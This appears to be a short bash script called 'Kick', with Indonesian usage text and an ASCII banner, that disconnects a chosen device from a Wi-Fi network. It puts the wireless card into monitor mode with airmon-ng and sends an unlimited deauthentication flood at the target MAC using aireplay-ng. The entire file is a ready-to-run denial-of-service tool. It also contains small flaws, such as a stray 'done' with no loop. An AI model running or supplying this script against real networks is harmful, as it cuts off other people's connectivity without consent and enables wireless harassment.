macMASTER=$(iwconfig 2>&1 | sed -n -e 's/^.*Access Point: //p')
macTARGET=$1
INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}')
INTERFACEMON="$INTERFACE""mon"
jhuruf=$(iw dev | awk '$1=="Interface"{print $2}' | awk '{print length}')
green="\e[0;92m"
red="\e[0;91m"
reset="\e[0m"
sleep 3
echo -e "${green}\n\n\n\tPenggunaan: kick [TargetMAC]\n\n\n${reset}"
echo -e " ${green}
_|_|_|            _|                  _|
 _|    _|_|_|_|  _|_|_|      _|_|_|  _|
 _|        _|    _|    _|  _|    _|  _|
 _|      _|      _|    _|  _|    _|  _|
_|_|_|  _|_|_|_|  _|_|_|      _|_|_|  _|
${reset}"
echo -e "${green}\nKick by Izbal ©2020 (http://github.com/izbal)${reset}"

# Deteksi ctrl + c auto matikan monitor mode dan restart network service
trap ctrl_c INT
function ctrl_c {
  echo -e "${green}\n\n\nRestarting Network..${reset}"
  sleep 3
  sudo airmon-ng stop $(iw dev | awk '$1=="Interface"{print $2}') && sudo service network-manager restart
  echo -e "${green}\n\n\nDone!${reset}"
  echo -e "${green}\nKick by Izbal ©2020 (http://github.com/izbal)${reset}"
  sleep 3
  clear
  cd
  exit
}

if [[ $jhuruf > 6 ]]; then
  echo -e "${green}Monitor mode already actived!${reset}"
  sudo aireplay-ng --deauth 0 -c $macTARGET -a ${macMASTER} $INTERFACE;
fi
  echo -e "${green}\n\n\nStarting Monitoring mode..\n\n\n${reset}"
  sudo airmon-ng check kill && sudo airmon-ng start $INTERFACE;
  sleep 3
  echo -e "${green}\n\n\nDeAuthing Target=${reset} ${red} $macTARGET \n\n\n${reset}"
  sleep 3
  sudo aireplay-ng --deauth 0 -c $macTARGET -a ${macMASTER} $INTERFACEMON;
done
